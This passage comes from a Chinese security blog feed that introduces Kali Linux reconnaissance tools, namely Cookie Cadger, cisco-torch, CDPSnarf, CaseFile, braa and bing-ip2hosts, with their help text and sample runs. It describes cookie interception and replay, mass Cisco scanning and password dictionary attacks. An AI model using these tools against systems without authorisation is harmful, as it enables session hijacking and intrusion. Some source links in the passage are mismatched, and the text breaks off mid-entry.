      <content type="html"><![CDATA[<h2 id="0x00-Cookie-Cadger介绍"><a href="#0x00-Cookie-Cadger介绍" class="headerlink" title="0x00 Cookie Cadger介绍"></a>0x00 Cookie Cadger介绍</h2><p>Cookie Cadger有助于识别使用不安全HTTP GET请求应用程序中的泄漏的信息。</p><p>自2010年Firesheep发布以来，网络提供商已开始逐步升级。如今，大多数主要网站可以在都在使用SSL/TLS协议，防止Cookie数据通过有线以太网或不安全的Wi-Fi泄漏。但实际上是，Firesheep更多的只是一个玩具，而不是一个工具。 Cookie Cadger是第一个用于拦截和重放特定的不安全的HTTP GET请求到浏览器中的开源渗透测试工具。</p><p>Cookie Cadgers请求枚举功能</p><p>Cookie Cadger是一个图形实用程序，利用Wireshark套件和Java的强大功能提供一个完全跨平台，完全开源的实用程序，可以监视有线以太网，不安全的Wi-Fi或加载数据包捕获文件进行离线分析。</p><p>工具来源：<a href="https://www.cookiecadger.com/" target="_blank" rel="external">https://www.cookiecadger.com/</a></p><p><a href="https://www.cookiecadger.com/" target="_blank" rel="external">Cookie Cadger主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/cookie-cadger.git;a=summary" target="_blank" rel="external">Kali Cookie Cadger Repo仓库</a></p><ul><li>作者：Matthew Sullivan</li><li>证书：FreeBSD</li></ul><h2 id="0x01-Cookie-Cadger功能"><a href="#0x01-Cookie-Cadger功能" class="headerlink" title="0x01 Cookie Cadger功能"></a>0x01 Cookie Cadger功能</h2><p>cdpsnarf - 有线和无线网络的Cookie工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cookie-cadger --help</div><div class="line">Cookie Cadger, version 1.07</div><div class="line">用法示例：</div><div class="line">java -jar CookieCadger.jar</div><div class="line">    --tshark=/usr/sbin/tshark</div><div class="line">    --headless=on</div><div class="line">    --interfacenum=2    (需要设置 --headless=on)</div><div class="line">    --detection=on</div><div class="line">    --demo=on</div><div class="line">    --update=on</div><div class="line">    --dbengine=mysql    (对于基于本地存储的文件，默认值为'sqlite')</div><div class="line">    --dbhost=localhost  (需要设置 --dbengine=mysql)</div><div class="line">    --dbuser=user       (需要设置 --dbengine=mysql)</div><div class="line">    --dbpass=pass       (需要设置 --dbengine=mysql)</div><div class="line">    --dbname=cadgerdata (需要设置 --dbengine=mysql)</div><div class="line">    --dbrefreshrate=15  (以秒为单位，需要设置 --dbengine=mysql，需要设置 --headless=off)</div></pre></td></tr></table></figure><h2 id="0x02-Cookie-Cadger用法示例"><a href="#0x02-Cookie-Cadger用法示例" class="headerlink" title="0x02 Cookie Cadger用法示例"></a>0x02 Cookie Cadger用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cookie-cadger</div></pre></td></tr></table></figure><p><img src="https://www.hackfun.org/usr/uploads/2016/10/4222776969.png" alt="cookie-cadger.png"></p><h2 id="0x03-说明"><a href="#0x03-说明" class="headerlink" title="0x03 说明"></a>0x03 说明</h2><p>最新版本的Kali已经移除了Cookie Cadger，你可以使用以下命令获取并安装：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# wget https://www.cookiecadger.com/files/CookieCadger-1.08.jar</div><div class="line">root@kali:~# chmod +x CookieCadger-1.08.jar</div><div class="line">root@kali:~# mv CookieCadger-1.08.jar /usr/bin/</div></pre></td></tr></table></figure><p></p><p>推荐Cookie Cadger官方说明文档：<a href="https://www.cookiecadger.com/wp-content/uploads/Cookie%20Cadger.pdf" target="_blank" rel="external">An Auditing Tool for Wi-Fi or Wired Ethernet Connections</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 嗅探 </tag>
            
            <tag> sniffing </tag>
            
            <tag> cookie cadger </tag>
            
            <tag> spoofing </tag>
            
            <tag> 欺骗 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集脆弱性分析漏洞利用之cisco-torch]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%86%E5%BC%B1%E6%80%A7%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bcisco-torch/</url>
      <content type="html"><![CDATA[<h2 id="0x00-cisco-torch介绍"><a href="#0x00-cisco-torch介绍" class="headerlink" title="0x00 cisco-torch介绍"></a>0x00 cisco-torch介绍</h2><p>Cisco Torch是集大规模扫描，指纹识别和利用工具的下一代“黑掉暴露的思科网络”工具，开发它的原因是上市场上提供的工具不能满足我们的需要。</p><p>Cisco-torch与类似工具不同的主要特性是大量启动多个后台扫描进程，以实现最高的扫描效率。此外，如果需要，它可以同时使用几种应用程序层指纹的方法。我们k’yi快速发现运行Telnet，SSH，Web，NTP和SNMP服务的远程思科主机，并针对发现的服务启动字典攻击。</p><p>工具来源：<a href="https://github.com/Zapotek/cdpsnarf" target="_blank" rel="external">https://github.com/Zapotek/cdpsnarf</a></p><p><a href="http://www.hackingciscoexposed.com/?link=tools" target="_blank" rel="external">cisco-torch主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/cisco-torch.git;a=summary%22" target="_blank" rel="external">Kali cisco-torch Repo仓库</a></p><ul><li>作者：Born by Arhont Team</li><li>证书：LGPL-2.1</li></ul><h2 id="0x01-cisco-torch功能"><a href="#0x01-cisco-torch功能" class="headerlink" title="0x01 cisco-torch功能"></a>0x01 cisco-torch功能</h2><p>cisco-torch - 思科设备扫描器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cisco-torch</div><div class="line">sing配置文件torch.conf ...</div><div class="line">正在载入include和plugin ...</div><div class="line"></div><div class="line">用法：cisco-torch &lt;选项&gt; &lt;IP地址，主机名，网络段&gt;</div><div class="line"></div><div class="line">或：cisco-torch &lt;选项&gt; -F &lt;主机列表文件&gt;</div><div class="line"></div><div class="line">可用选项：</div><div class="line">-O          &lt;输出文件&gt;</div><div class="line">-A          组合所有指纹扫描类型</div><div class="line">-t          思科Telnetd扫描</div><div class="line">-s          思科SSHd扫描</div><div class="line">-u          思科SNMP扫描</div><div class="line">-g          Cisco配置或tftp文件下载</div><div class="line">-n          NTP指纹扫描</div><div class="line">-j          TFTP指纹扫描</div><div class="line">-l &lt;type&gt;   日志记录层次</div><div class="line">            c 关键摘要模式（默认）</div><div class="line">            v 详细模式</div><div class="line">            d 调试模式</div><div class="line">-w          思科Web服务器扫描</div><div class="line">-z          思科IOS HTTP授权漏洞扫描</div><div class="line">-c          扫描支持SSL思科Web服务器</div><div class="line">-b          密码字典攻击（仅与-s，-u，-c，-w，-j或-t一起使用）</div><div class="line">-V          打印版本信息并退出</div><div class="line"></div><div class="line">示例:       </div><div class="line">           cisco-torch -A 10.10.0.0/16</div><div class="line">           cisco-torch -s -b -F sshtocheck.txt</div><div class="line">           cisco-torch -w -z 10.10.0.0/16</div><div class="line">           cisco-torch -j -b -g -F tftptocheck.txt</div></pre></td></tr></table></figure><h2 id="0x02-cisco-torch用法示例"><a href="#0x02-cisco-torch用法示例" class="headerlink" title="0x02 cisco-torch用法示例"></a>0x02 cisco-torch用法示例</h2><p>运行所有可用的扫描类型（-A）针对目标IP地址（192.168.99.202）：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cisco-torch -A 192.168.99.202</div><div class="line">Using config file torch.conf...</div><div class="line">Loading include and plugin ...</div><div class="line"></div><div class="line"><span class="meta">#</span>##############################################################</div><div class="line"><span class="meta">#</span>   Cisco Torch Mass Scanner                   #</div><div class="line"><span class="meta">#</span>   Becase we need it...                                      #</div><div class="line"><span class="meta">#</span>   http://www.arhont.com/cisco-torch.pl                      #</div><div class="line"><span class="meta">#</span>##############################################################</div><div class="line"></div><div class="line">List of targets contains 1 host(s)</div><div class="line">8853:   Checking 192.168.99.202 ...</div><div class="line">HUH db not found, it should be in fingerprint.db</div><div class="line">Skipping Telnet fingerprint</div><div class="line">* Cisco by SNMP found ***</div><div class="line">*System Description: Cisco Internetwork Operating System Software</div><div class="line">IOS (tm) 3600 Software (C3640-IK9O3S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)</div><div class="line">Technical Support: http://www.cisco.com/techsupport</div><div class="line">Copyright (c) 1986-2007 by cisco Systems, Inc.</div><div class="line">Compiled Wed 24-Jan-07 1</div><div class="line"></div><div class="line">Cisco-IOS Webserver found</div><div class="line"> HTTP/1.1 401 Unauthorized</div><div class="line">Date: Tue, 13 Apr 1993 00:57:07 GMT</div><div class="line">Server: cisco-IOS</div><div class="line">Accept-Ranges: none</div><div class="line">WWW-Authenticate: Basic realm="level_15_access"</div><div class="line"></div><div class="line">401 Unauthorized</div><div class="line"></div><div class="line"></div><div class="line"> Cisco WWW-Authenticate webserver found</div><div class="line"> HTTP/1.1 401 Unauthorized</div><div class="line">Date: Tue, 13 Apr 1993 00:57:07 GMT</div><div class="line">Server: cisco-IOS</div><div class="line">Accept-Ranges: none</div><div class="line">WWW-Authenticate: Basic realm="level_15_access"</div><div class="line"></div><div class="line">401 Unauthorized</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">---&gt;</span></div><div class="line">- All scans done. Cisco Torch Mass Scanner  -</div><div class="line"><span class="meta">---&gt;</span> Exiting.</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> cdpsnarf </tag>
            
            <tag> exploitation tools </tag>
            
            <tag> vulnerability analysis </tag>
            
            <tag> 脆弱性分析 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之CDPSnarf]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDPSnarf/</url>
      <content type="html"><![CDATA[<h2 id="0x00-CDPSnarf介绍"><a href="#0x00-CDPSnarf介绍" class="headerlink" title="0x00 CDPSnarf介绍"></a>0x00 CDPSnarf介绍</h2><p>CDPSnarf是专门用于从CDP包提取信息的网络嗅探器，它提供所有信息通过一个“show cdp neighbors detail”命令返回Cisco路由器信息，甚至更多信息。</p><p>其工作原理主要是利用Cisco的<a href="https://en.wikipedia.org/wiki/Cisco_Discovery_Protocol" target="_blank" rel="external">CDP协议</a>，来发现连接Cisco设备的设备的相关信息（CDP协议中包含），包括IP地址、操作系统及其版本、路由信息等等。几乎所有的Cisco设备都支持CDP协议。实际上它就是个接受Cisco设备发送的CDP协议数据包的软件，然后通过解析数据包来得到设备的信息，协议包中的包含的信息可以参考下面的特性。</p><ul><li>CDP广告之间的时间间隔</li><li>CDP协议的版本号</li><li>TTL</li><li>设备的ID号</li><li>软件版本</li><li>平台版本</li><li>地址信息</li><li>端口号</li><li>功能</li><li>复合</li><li>将输出保存成PCAP格式的文件</li><li>从PCAP格式文件中读</li><li>Debugging 协议数据包</li><li>用IPv4和IPv6的协议测试</li></ul><p>工具来源：<a href="https://github.com/Zapotek/cdpsnarf" target="_blank" rel="external">https://github.com/Zapotek/cdpsnarf</a></p><p><a href="https://github.com/Zapotek/cdpsnarf" target="_blank" rel="external">CDPSnarf主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/cdpsnarf.git;a=summary" target="_blank" rel="external">Kali CDPSnarf Repo仓库</a></p><ul><li>作者：Tasos “Zapotek” Laskos</li><li>证书：GPLv2</li></ul><h2 id="0x01-CDPSnarf功能"><a href="#0x01-CDPSnarf功能" class="headerlink" title="0x01 CDPSnarf功能"></a>0x01 CDPSnarf功能</h2><p>cdpsnarf - 提取CDP包中信息的网络嗅探器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cdpsnarf -h</div><div class="line">CDPSnarf v0.1.6 [$Rev: 797 $] initiated.</div><div class="line">   作者: Tasos "Zapotek" Laskos</div><div class="line">           &lt;tasos.laskos@gmail.com&gt;</div><div class="line">              &lt;zapotek@segfault.gr&gt;</div><div class="line">   主页: http://github.com/Zapotek/cdpsnarf</div><div class="line"></div><div class="line">cdpsnarf -i &lt;dev&gt; [-h] [-w savefile] [-r dumpfile] [-d]</div><div class="line"></div><div class="line">    -i  定义嗅探接口</div><div class="line">    -w  将数据包写入PCAP转储文件</div><div class="line">    -r  从PCAP转储文件读取数据包</div><div class="line">    -d  显示调试信息</div><div class="line">    -h  显示帮助消息并退出</div></pre></td></tr></table></figure><h2 id="0x02-CDPSnarf用法示例"><a href="#0x02-CDPSnarf用法示例" class="headerlink" title="0x02 CDPSnarf用法示例"></a>0x02 CDPSnarf用法示例</h2><p>在 eth0（-i）接口上扫描，并把结果写入到 test.pcap（-w）文件：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cdpsnarf -i eth0 -w test.pcap</div><div class="line">CDPSnarf v0.1.6 [$Rev: 797 $] initiated.</div><div class="line">   Author: Tasos "Zapotek" Laskos</div><div class="line">           &lt;tasos.laskos@gmail.com&gt;</div><div class="line">              &lt;zapotek@segfault.gr&gt;</div><div class="line">   Website: http://github.com/Zapotek/cdpsnarf</div><div class="line"></div><div class="line">Reading packets from eth0.</div><div class="line">Waiting for a CDP packet...</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 嗅探 </tag>
            
            <tag> cdp </tag>
            
            <tag> cdpsnarf </tag>
            
            <tag> sniffing </tag>
            
            <tag> enumeration </tag>
            
            <tag> 思科发现协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之CaseFile]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCaseFile/</url>
      <content type="html"><![CDATA[<h2 id="0x00-CaseFile介绍"><a href="#0x00-CaseFile介绍" class="headerlink" title="0x00 CaseFile介绍"></a>0x00 CaseFile介绍</h2><p>CaseFile是Maltego的小弟弟。它瞄准了一个独特的“离线”分析师市场，其主要信息来源不仅能从开源情报方面获得，还可以通过编程方式查询。CaseFile可以让在实地工作的调查人员和分析人员，从团队中的其他人那里获得情报，并建立他们调查的信息地图。</p><p>CaseFile使您具有与Maltego相同的图像化操作灵活性和性能快速添加，链接和分析数据的功能，而无需转换数据格式，CaseFile的价格大约是Maltego价格的三分之一。</p><p>工具来源： <a href="http://paterva.com/web6/products/casefile.php" target="_blank" rel="external">http://paterva.com/web6/products/casefile.php</a></p><p><a href="http://paterva.com/" target="_blank" rel="external">CaseFile主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/casefile.git;a=summary" target="_blank" rel="external">Kali CaseFile Repo仓库</a></p><ul><li>作者：Faisal Dean</li><li>证书：GPLv2</li></ul><h2 id="0x01-CaseFile是什么？"><a href="#0x01-CaseFile是什么？" class="headerlink" title="0x01 CaseFile是什么？"></a>0x01 CaseFile是什么？</h2><p>CaseFile是一个视觉上情报整理应用程序，可用于确定数百种不同类型的信息之间的关系和真实世界链接，它使您能够快速查看第二，第三和第n顺序关系，并找到链接，这些其他的情报工具却做不到。<br>CaseFile捆绑了许多不同类型的实体，这些实体通常用于调查发现，以便您快速有效地采取行动。 CaseFile还能够添加自定义实体类型，允许您将产品扩展到自己的数据集。</p><h2 id="0x02-CaseFile可以为你做什么？"><a href="#0x02-CaseFile可以为你做什么？" class="headerlink" title="0x02 CaseFile可以为你做什么？"></a>0x02 CaseFile可以为你做什么？</h2><p>CaseFile可用于几乎所有类型调查的信息收集，分析和情报阶段，从IT安全，执法和任何数据驱动的工作。 它将节省您的时间，并将允许您更准确和更聪明的工作。<br>CaseFile能够可视化以CSV，XLS和XLSX电子表格格式存储的数据集。<br>CaseFile通过直观地展示搜索项之间的互联链接，帮助您进入思维过程。<br>如果访问“隐藏”信息确定您的成功，CaseFile可以帮助您发现它。</p><h2 id="0x03-CaseFile用法示例"><a href="#0x03-CaseFile用法示例" class="headerlink" title="0x03 CaseFile用法示例"></a>0x03 CaseFile用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# casefile</div></pre></td></tr></table></figure><p><img src="https://www.hackfun.org/usr/uploads/2016/10/664386137.png" alt="casefile.png"></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> casefile </tag>
            
            <tag> recon </tag>
            
            <tag> reporting </tag>
            
            <tag> 信息侦察 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之braa]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bbraa/</url>
      <content type="html"><![CDATA[<h2 id="0x00-braa介绍"><a href="#0x00-braa介绍" class="headerlink" title="0x00 braa介绍"></a>0x00 braa介绍</h2><p>Braa是大规模SNMP扫描工具,这种工具的预期用途当然是使SNMP（Simple Network Management Protocol简单网络管理）查询 - 但不同于来自net-snmp的snmpget或snmpwalk，它能够在单个进程中同时查询几十或几百个主机。 因此，它消耗非常少的系统资源，并且扫描非常快。</p><p>Braa通过它的OWN snmp栈实现，所以它不需要任何SNMP库，如net-snmp。 它的实现非常脏，只支持几种数据类型，并且在任何情况下都不能说“符合标准”！ 但是它跑起来飞快， 因为这个原因（好吧，也是因为我的懒惰），在braa中没有ASN.1解析器 - 你必须知道OID的数值（例如.1.3.6.1.2.1.1.5.0 而不是用system.sysName.0）。</p><p>OID可以理解为有规则的设备参数编码，snmp协议将设备的各种参数按树形结构进行分组，从树的根部开始，每一个层级节点会有一个编码，将这些层级编码以“.”作为分隔符，将其拼接起来所形成的一串编码就叫OID，通过OID可以对该OID表示的参数进行操作。<br>可以参考<a href="http://www.cnblogs.com/aspx-net/p/3554044.html" target="_blank" rel="external">SNMP监控一些常用OID的总结</a></p><p>工具来源：braa README</p><p><a href="http://s-tech.elsat.net.pl/" target="_blank" rel="external">braa主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/braa.git;a=summary" target="_blank" rel="external">Kali braaRepo仓库</a></p><ul><li>作者：Mateusz ‘mteg’ Golicz</li><li>证书：GPLv2</li></ul><h2 id="0x01-braa功能"><a href="#0x01-braa功能" class="headerlink" title="0x01 braa功能"></a>0x01 braa功能</h2><p>Braa - 大规模SNMP扫描工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">root@kali:~# braa</div><div class="line">braa 0.81 - Mateusz'mteg'Golicz &lt;mtg@elsat.net.pl&gt;，2003 - 2006</div><div class="line">用法：braa [options] [query1] [query2] ...</div><div class="line">  -h         显示此帮助</div><div class="line">  -2         声明SNMP2C代理</div><div class="line">  -v         执行所有查询后显示简要摘要</div><div class="line">  -x         十六进制转储八位字节串</div><div class="line">  -t &lt;s&gt;     获得响应前等待数秒</div><div class="line">  -d &lt;s&gt;     发送每个数据包后等待微秒数</div><div class="line">  -p &lt;s&gt;     在后续遍之间等待数毫秒</div><div class="line">  -f &lt;file&gt;  从文件&lt;file&gt;加载查询（逐行）</div><div class="line">  -a &lt;time&gt;  在&lt;time&gt;秒后退出</div><div class="line">  -r &lt;rc&gt;    重试次数（默认值：3）</div><div class="line"></div><div class="line">查询格式：</div><div class="line">  GET:   [community@]iprange[:port]:oid[/id]</div><div class="line">  WALK:  [community@]iprange[:port]:oid.*[/id]</div><div class="line">  SET:   [community@]iprange[:port]:oid=value[/id]</div><div class="line"></div><div class="line">例子：</div><div class="line">         public@10.253.101.1:161:.1.3.6.*</div><div class="line">         10.253.101.1-10.253.101.255:.1.3.6.1.2.1.1.4.0=sme</div><div class="line">         10.253.101.1:.1.3.6.1.2.1.1.1.0/description</div><div class="line"></div><div class="line">也可以一次指定多个查询：</div><div class="line">         10.253.101.1-10.253.101.255:.1.3.6.1.2.1.1.4.0=sme,.1.3.6.*</div><div class="line">         （将.1.3.6.1.2.1.1.4.0设置为'me'，并从.1.3.6开始）</div><div class="line"></div><div class="line">SET查询的值必须在前面加上指定值类型的字符：</div><div class="line">  i      是INTEGER类型</div><div class="line">  a      是IPADDRESS类型</div><div class="line">  s      是OCTET STRING类型</div><div class="line">  o      是OBJECT IDENTIFIER类型</div><div class="line">如果缺少类型说明符，则会自动检测值类型</div></pre></td></tr></table></figure><h2 id="0x02-braa用法示例"><a href="#0x02-braa用法示例" class="headerlink" title="0x02 braa用法示例"></a>0x02 braa用法示例</h2><p>使用公开公布的OID字符串在192.168.1.215上运行遍历SNMP树，查询.1.3.6下的所有OID：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# braa public@192.168.1.215:.1.3.6.*</div><div class="line">192.168.1.215:122ms:.1.3.6.1.2.1.1.1.0:Linux redhat.biz.local 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686</div><div class="line">192.168.1.215:143ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10</div><div class="line">192.168.1.215:122ms:.1.3.6.1.2.1.1.3.0:4051218219</div><div class="line">192.168.1.215:122ms:.1.3.6.1.2.1.1.4.0:Root &lt;root@localhost&gt; (configure /etc/snmp/snmp.local.conf)</div><div class="line">192.168.1.215:143ms:.1.3.6.1.2.1.1.5.0:redhat.biz.local</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> enumeration </tag>
            
            <tag> 枚举 </tag>
            
            <tag> braa </tag>
            
            <tag> snmp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之bing-ip2hosts]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bbing-ip2hosts/</url>
      <content type="html"><![CDATA[<h2 id="0x00-bing-ip2hosts介绍"><a href="#0x00-bing-ip2hosts介绍" class="headerlink" title="0x00 bing-ip2hosts介绍"></a>0x00 bing-ip2hosts介绍</h2><p>Bing.com是微软拥有的以前称为MSN搜索和实时搜索的搜索引擎。它具有搜索在特定IP地址上的网站的独特功能。 Bing-ip2hosts使用此功能枚举Bing已为特定IP地址编入索引的所有主机名。这种技术被认为是在渗透测试的信息收集阶段的最佳方法，以便可以发现更大的潜在攻击面。 Bing-ip2hosts是用Linux上的Bash脚本语言编写的，因为使用移动接口的缘故，所以不需要API密钥。</p><p>工具来源：<a href="http://www.morningstarsecurity.com/research/bing-ip2hosts" target="_blank" rel="external">http://www.morningstarsecurity.com/research/bing-ip2hosts</a></p><p><a href="http://labs.portcullis.co.uk/application/acccheck" target="_blank" rel="external">bing-ip2hosts主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/acccheck.git;a=summary" target="_blank" rel="external">Kali bing-ip2hosts Repo仓库</a></p><ul><li>作者：Andrew Horton</li><li>证书：GPLv3</li></ul><h2 id="0x01-bing-ip2hosts功能"><a href="#0x01-bing-ip2hosts功能" class="headerlink" title="0x01 bing-ip2hosts功能"></a>0x01 bing-ip2hosts功能</h2><p>bing-ip2hosts - 使用bing.com枚举给定IP的主机名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">root@kali:~# bing-ip2hosts -h</div><div class="line">bing-ip2hosts (o.4) by Andrew Horton aka urbanadventurer</div><div class="line">Homepage: http://www.morningstarsecurity.com/research/bing-ip2hosts</div><div class="line"></div><div class="line">在渗透测试中的Web情报收集和攻击层面映射虚拟主机很有用</div><div class="line">查找与目标共享IP地址的主机名，可以是主机名或IP地址</div><div class="line">利用Microsoft Bing.com的能力通过IP地址搜索，例如：“IP：210.48.71.196”</div><div class="line">用法: /usr/bin/bing-ip2hosts [选项] &lt;IP地址|主机名&gt;</div><div class="line"></div><div class="line">选项:</div><div class="line">-n       关闭进度指示动画</div><div class="line">-t &lt;DIR&gt; 使用指定目录而不是/tmp目录，该目录必须存在</div><div class="line">-i       可选CSV输出，在每行上输出IP和主机名，以逗号分隔</div><div class="line">-p       可选http：//前缀输出，方便在shell中右键单击打开</div></pre></td></tr></table></figure><h2 id="0x02-bing-ip2hosts用法示例"><a href="#0x02-bing-ip2hosts用法示例" class="headerlink" title="0x02 bing-ip2hosts用法示例"></a>0x02 bing-ip2hosts用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# bing-ip2hosts -p -t /root/test microsoft.com</div><div class="line">[ 65.55.58.201 | Scraping 1 | Found 0 | / ]</div><div class="line">http://microsoft.com</div><div class="line">http://research.microsoft.com</div><div class="line">http://www.answers.microsoft.com</div><div class="line">http://www.microsoft.com</div><div class="line">http://www.msdn.microsoft.com</div></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# bing-ip2hosts -p -t /root/test 173.194.33.80</div><div class="line">[ 173.194.33.80 | Scraping 60-69 of 73 | Found 41 | | ]| / ]</div><div class="line">http://asia.google.com</div><div class="line">http://desktop.google.com</div><div class="line">http://ejabat.google.com</div><div class="line">http://google.netscape.com</div><div class="line">http://partner-client.google.com</div><div class="line">http://picasa.google.com</div></pre></td></tr></table></figure><h2 id="0x03-提示"><a href="#0x03-提示" class="headerlink" title="0x03 提示"></a>0x03 提示</h2><p>最新的Kali已经移除了bing-ip2hosts，如果要使用bing-ip2hosts可以使用以下命令获取并安装：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div 